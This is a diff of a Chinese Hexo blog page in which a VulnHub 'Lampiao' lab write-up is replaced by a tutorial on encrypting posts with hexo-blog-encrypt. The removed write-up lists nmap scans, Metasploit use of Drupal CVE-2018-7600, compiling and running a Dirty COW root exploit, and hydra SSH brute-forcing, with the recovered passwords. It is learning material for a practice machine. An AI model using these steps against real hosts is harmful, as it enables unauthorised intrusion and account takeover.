@@ -16,41 +16,21 @@
   <meta name="author" content="piiick">
   <meta name="keywords" content="">
   
-    <meta name="description" content="准备靶机地址：Lampião: 1 ~ VulnHub 下载镜像，从Vm打开，给靶机设为NAT模式 开打主机发现扫描kali下的整个c段，可以用老方法，先关闭靶机扫一次，再开启扫一次，多的就是靶机 sudo nmap -sn 192.168.200.128&#x2F;24  我这里是192.168.200.135 端口扫描sudo nmap -min-rate 10000 192.168.200.134">
+    <meta name="description" content="第一步安装开源插件hexo-blog-encrypt npm install --save hexo-blog-encrypt 第二步配置hexo中的_config.yml文件，在文件末尾添加如下代码 12345678910111213141516# 安全设置encrypt:  # 启用插件  enable: true  # 自定义加密相关设置  abstract: &quot;这里的内容加密了，">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Lampiao打靶思路">
-<meta property="og:url" content="http://example.com/2024/12/16/Lampiao%E6%89%93%E9%9D%B6%E6%80%9D%E8%B7%AF/index.html">
+<meta property="og:title" content="为hexo文章加密">
+<meta property="og:url" content="http://example.com/2025/06/16/hexo%E6%B7%BB%E5%8A%A0%E5%AF%86%E7%A0%81/index.html">
 <meta property="og:site_name" content="piiick的博客">
-<meta property="og:description" content="准备靶机地址：Lampião: 1 ~ VulnHub 下载镜像，从Vm打开，给靶机设为NAT模式 开打主机发现扫描kali下的整个c段，可以用老方法，先关闭靶机扫一次，再开启扫一次，多的就是靶机 sudo nmap -sn 192.168.200.128&#x2F;24  我这里是192.168.200.135 端口扫描sudo nmap -min-rate 10000 192.168.200.134">
+<meta property="og:description" content="第一步安装开源插件hexo-blog-encrypt npm install --save hexo-blog-encrypt 第二步配置hexo中的_config.yml文件，在文件末尾添加如下代码 12345678910111213141516# 安全设置encrypt:  # 启用插件  enable: true  # 自定义加密相关设置  abstract: &quot;这里的内容加密了，">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/images/Lampiao/1.png">
-<meta property="og:image" content="http://example.com/images/Lampiao/2.png">
-<meta property="og:image" content="http://example.com/images/Lampiao/3.png">
-<meta property="og:image" content="http://example.com/images/Lampiao/4.png">
-<meta property="og:image" content="http://example.com/images/Lampiao/5.png">
-<meta property="og:image" content="http://example.com/images/Lampiao/6.png">
-<meta property="og:image" content="http://example.com/images/Lampiao/7.png">
-<meta property="og:image" content="http://example.com/images/Lampiao/8.png">
-<meta property="og:image" content="http://example.com/images/Lampiao/9.png">
-<meta property="og:image" content="http://example.com/images/Lampiao/11.png">
-<meta property="og:image" content="http://example.com/images/Lampiao/10.png">
-<meta property="og:image" content="http://example.com/images/Lampiao/12.png">
-<meta property="og:image" content="http://example.com/images/Lampiao/13.png">
-<meta property="og:image" content="http://example.com/images/Lampiao/14.png">
-<meta property="og:image" content="http://example.com/images/Lampiao/15.png">
-<meta property="og:image" content="http://example.com/images/Lampiao/16.png">
-<meta property="og:image" content="http://example.com/images/Lampiao/17.png">
-<meta property="og:image" content="http://example.com/images/Lampiao/18.png">
-<meta property="og:image" content="http://example.com/images/Lampiao/19.png">
-<meta property="article:published_time" content="2024-12-15T16:00:00.000Z">
-<meta property="article:modified_time" content="2024-12-16T03:55:54.339Z">
+<meta property="article:published_time" content="2025-06-15T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-06-17T09:14:25.014Z">
 <meta property="article:author" content="piiick">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://example.com/images/Lampiao/1.png">
   
   
   
-  <title>Lampiao打靶思路 - piiick的博客</title>
+  <title>为hexo文章加密 - piiick的博客</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -266,7 +246,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="Lampiao打靶思路"></span>
+            <span id="subtitle" data-typed-text="为hexo文章加密"></span>
           
         </div>
 
@@ -277,8 +257,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2024-12-16 00:00" pubdate>
-          2024年12月16日 凌晨
+        <time datetime="2025-06-16 00:00" pubdate>
+          2025年6月16日 凌晨
         </time>
       </span>
     
@@ -289,7 +269,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          458 字
+          304 字
         
       </span>
     
@@ -300,7 +280,7 @@
         
         
         
-          12 分钟
+          8 分钟
         
       </span>
     
@@ -359,83 +339,30 @@ document.getElementById('banner').setAttribute('style',`background: url('${banne
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">Lampiao打靶思路</h1>
+            <h1 id="seo-header">为hexo文章加密</h1>
             
             
               <div class="markdown-body">
                 
-                <h3 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h3><p>靶机地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/lampiao-1,249/">Lampião: 1 ~ VulnHub</a></p>
-<p>下载镜像，从Vm打开，给靶机设为NAT模式</p>
-<h3 id="开打"><a href="#开打" class="headerlink" title="开打"></a>开打</h3><h4 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h4><p>扫描kali下的整个c段，可以用老方法，先关闭靶机扫一次，再开启扫一次，多的就是靶机</p>
-<p><code>sudo nmap -sn 192.168.200.128/24</code></p>
-<p><img src="/images/Lampiao/1.png" srcset="/images/loading.gif" lazyload></p>
-<p>我这里是<code>192.168.200.135</code></p>
-<h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><p><code>sudo nmap -min-rate 10000 192.168.200.134</code></p>
-<p><img src="/images/Lampiao/2.png" srcset="/images/loading.gif" lazyload></p>
-<p>可以发现开放了22端口和80端口</p>
-<p>我们访问80端口，发现80端口没东西</p>
-<p><img src="/images/Lampiao/3.png" srcset="/images/loading.gif" lazyload></p>
-<p>可能还有没扫到的端口</p>
-<p>做一个全端口扫描</p>
-<p><code>nmap -p- 192.168.200.135</code></p>
-<p><img src="/images/Lampiao/4.png" srcset="/images/loading.gif" lazyload></p>
-<p>确实有一个1898端口</p>
-<p>看看详细信息</p>
-<p><code>sudo nmap -sT -sV -sC -O -p1898 192.168.200.135</code></p>
-<p><img src="/images/Lampiao/5.png" srcset="/images/loading.gif" lazyload></p>
-<p>可以发现是开放http服务，并且使用的CMS为Drupal，版本为7</p>
-<h4 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h4><p>通过搜索可知Drupal 7存在CVE-2018-7600</p>
-<p>我们看看MSF有没有历史漏洞</p>
-<p><code>search Drupal</code></p>
-<p><img src="/images/Lampiao/6.png" srcset="/images/loading.gif" lazyload></p>
-<p>第二条是2018年的</p>
-<p><code>use 1</code></p>
-<p><code>show options</code></p>
-<p><img src="/images/Lampiao/7.png" srcset="/images/loading.gif" lazyload></p>
-<p><code>set rhosts 192.168.200.135</code></p>
-<p><code>set rport 1898</code></p>
-<p>targeturi选择(<strong>后面发现不填也是可以的</strong>)，在一般的Drupal CVE-2018-7600中使用的是<code>/user/register</code></p>
-<p>而我们这里要使用<code>/?q=user/register</code>，在主页面点击Create new account即可发现</p>
-<p><img src="/images/Lampiao/8.png" srcset="/images/loading.gif" lazyload></p>
-<p><code>set targeturi /?q=user/register </code></p>
-<p><img src="/images/Lampiao/9.png" srcset="/images/loading.gif" lazyload></p>
-<p><code>run</code></p>
-<p><img src="/images/Lampiao/11.png" srcset="/images/loading.gif" lazyload></p>
-<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>上传探针到&#x2F;tmp目录</p>
-<p><img src="/images/Lampiao/10.png" srcset="/images/loading.gif" lazyload></p>
-<p><code>shell</code></p>
-<p><code>cd /tmp</code>进入&#x2F;tmp目录</p>
-<p><code>ls -l </code>查看文件权限</p>
-<p><code>chmod +x 1.sh</code>  给权限</p>
-<p><code>./1.sh</code>  运行脚本</p>
-<p><img src="/images/Lampiao/12.png" srcset="/images/loading.gif" lazyload></p>
-<p>发现存在脏牛提权</p>
-<p><img src="/images/Lampiao/13.png" srcset="/images/loading.gif" lazyload></p>
-<p>下载exp：<a target="_blank" rel="noopener" href="https://github.com/gbonacini/CVE-2016-5195">https://github.com/gbonacini/CVE-2016-5195</a></p>
-<p>先退出shell </p>
-<p>上传cow.cpp</p>
-<p><code>upload cow.cpp /tmp/cow.cpp</code></p>
-<p><img src="/images/Lampiao/14.png" srcset="/images/loading.gif" lazyload></p>
-<p><code>g++ -Wall -pedantic -o2 -std=c++11 -pthread -o dcow cow.cpp -lutil</code>编译exp<br><code>./dcow</code>执行exp</p>
-<p><img src="/images/Lampiao/15.png" srcset="/images/loading.gif" lazyload></p>
-<p>root密码被改为<code>dirtyCowFun</code>了</p>
-<p>直接使用ssh登录</p>
-<p><code>ssh root@192.168.200.135</code></p>
-<p><code>cat flag.txt</code></p>
-<p><img src="/images/Lampiao/16.png" srcset="/images/loading.gif" lazyload></p>
-<p>结束</p>
-<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>Lampiao是一个简单靶场，主要内容就是对CVE-2018-7600的使用和脏牛提权</p>
-<h5 id="其他："><a href="#其他：" class="headerlink" title="其他："></a>其他：</h5><p>1898端口页面还存在一个普通用户的用户名和密码，在<code>/?q=node/2</code>下可以发现m4a文件里有用户名tiago</p>
-<p><img src="/images/Lampiao/17.png" srcset="/images/loading.gif" lazyload></p>
-<p>利用cewl生成密码字典</p>
-<p><code>cewl http://192.168.200.135:1898/ -w Lampiao.txt</code></p>
-<p>hydra爆破ssh</p>
-<p><code>hydra -l tiago -P Lampiao.txt 192.168.200.135 ssh</code></p>
-<p><img src="/images/Lampiao/18.png" srcset="/images/loading.gif" lazyload></p>
-<p>爆破出密码<code>Virgulino</code></p>
-<p><code>ssh tiago@192.168.200.135</code></p>
-<p>成功登入tiago</p>
-<p><img src="/images/Lampiao/19.png" srcset="/images/loading.gif" lazyload></p>
+                <h3 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h3><p>安装开源插件<a target="_blank" rel="noopener" href="https://github.com/D0n9X1n/hexo-blog-encrypt">hexo-blog-encrypt</a></p>
+<p><code>npm install --save hexo-blog-encrypt</code></p>
+<h3 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h3><p>配置hexo中的_config.yml文件，在文件末尾添加如下代码</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># 安全设置</span><br><span class="hljs-attr">encrypt:</span><br>  <span class="hljs-comment"># 启用插件</span><br>  <span class="hljs-attr">enable:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-comment"># 自定义加密相关设置</span><br>  <span class="hljs-attr">abstract:</span> <span class="hljs-string">&quot;这里的内容加密了，需要密码哦。&quot;</span><br>  <span class="hljs-attr">message:</span> <span class="hljs-string">&quot;请输入密码查看本文。&quot;</span><br>  <span class="hljs-comment"># 可以在这里设定特定标签对应的默认密码</span><br>  <span class="hljs-attr">tags:</span><br>    <span class="hljs-bullet">-</span> [<span class="hljs-attr">name:</span> <span class="hljs-string">&quot;encryptAsSecret&quot;</span>, <span class="hljs-attr">password:</span> <span class="hljs-string">&quot;yoursecret&quot;</span>]<br>  <span class="hljs-comment"># 错误消息设置</span><br>  <span class="hljs-attr">wrong_pass_message:</span> <span class="hljs-string">&quot;密码错误，请重试。&quot;</span><br>  <span class="hljs-attr">wrong_hash_message:</span> <span class="hljs-string">&quot;内容认证失败，但仍可尝试查看。&quot;</span><br>  <span class="hljs-comment"># 是否禁用日志记录</span><br>  <span class="hljs-attr">silent:</span> <span class="hljs-literal">false</span><br><br></code></pre></td></tr></table></figure>
+
+<p>配置项说明：</p>
+<ul>
+<li>enable: 是否启用加密功能，设置为 true 启用。</li>
+<li>abstract: 加密文章的摘要，显示在文章列表页。</li>
+<li>message: 密码输入框上方的描述性文字。</li>
+<li>tags: 标签配置，可以为不同标签设置不同的密码。</li>
+<li>wrong_pass_message: 密码错误时的提示信息。</li>
+<li>wrong_hash_message: 解密内容无法验证时的提示信息。</li>
+</ul>
+<h3 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h3><p>使用</p>
+<p>在需要加密文章的YAML头部添加如下设置：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-meta">---</span><br><span class="hljs-attr">title:</span> <span class="hljs-comment">###</span><br><span class="hljs-attr">date:</span> <span class="hljs-string">XXXX-XX-XX</span> <span class="hljs-string">XX:XX:XX</span><br><span class="hljs-attr">password:</span> <span class="hljs-string">&quot;你的密码必须在引号里面&quot;</span><br><span class="hljs-meta">---</span><br></code></pre></td></tr></table></figure>
+
+<p>参考：<a target="_blank" rel="noopener" href="https://oceanphy.github.io/2024/11/08/hexo%E5%8D%9A%E5%AE%A2%E5%8A%A0%E5%AF%86%E8%AE%BE%E7%BD%AE/">hexo博客加密设置 - 安知命</a></p>
 
                 
               </div>
@@ -454,7 +381,7 @@ document.getElementById('banner').setAttribute('style',`background: url('${banne
     
       <span class="category-chain">
         
-  <a href="/categories/%E7%BA%A2%E9%98%9F%E6%89%93%E9%9D%B6/" class="category-chain-item">红队打靶</a>
+  <a href="/categories/hexo/" class="category-chain-item">hexo</a>
   
   
 
@@ -474,8 +401,8 @@ document.getElementById('banner').setAttribute('style',`background: url('${banne
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>Lampiao打靶思路</div>
-      <div>http://example.com/2024/12/16/Lampiao打靶思路/</div>
+      <div>为hexo文章加密</div>
+      <div>http://example.com/2025/06/16/hexo添加密码/</div>
     </div>
     <div class="license-meta">
       
@@ -487,7 +414,7 @@ document.getElementById('banner').setAttribute('style',`background: url('${banne
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2024年12月16日</div>
+          <div>2025年6月16日</div>
         </div>
       
       
@@ -519,9 +446,9 @@ document.getElementById('banner').setAttribute('style',`background: url('${banne
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2025/06/16/hexo%E6%B7%BB%E5%8A%A0%E5%AF%86%E7%A0%81/" title="为hexo文章加密">
+                      <a href="/2025/06/17/app%E6%B8%97%E9%80%8F-%E6%8A%93%E5%8C%85%E9%85%8D%E7%BD%AE/" title="app渗透-基础抓包配置:一段比较曲折的历程">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">为hexo文章加密</span>
+                        <span class="hidden-mobile">app渗透-基础抓包配置:一段比较曲折的历程</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -529,8 +456,8 @@ document.getElementById('banner').setAttribute('style',`background: url('${banne
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2024/12/09/GoldenEye%E6%89%93%E9%9D%B6%E6%80%9D%E8%B7%AF/" title="GoldenEye打靶思路">
-                        <span class="hidden-mobile">GoldenEye打靶思路</span>
+                      <a href="/2024/12/16/Lampiao%E6%89%93%E9%9D%B6%E6%80%9D%E8%B7%AF/" title="Lampiao打靶思路">
+                        <span class="hidden-mobile">Lampiao打靶思路</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
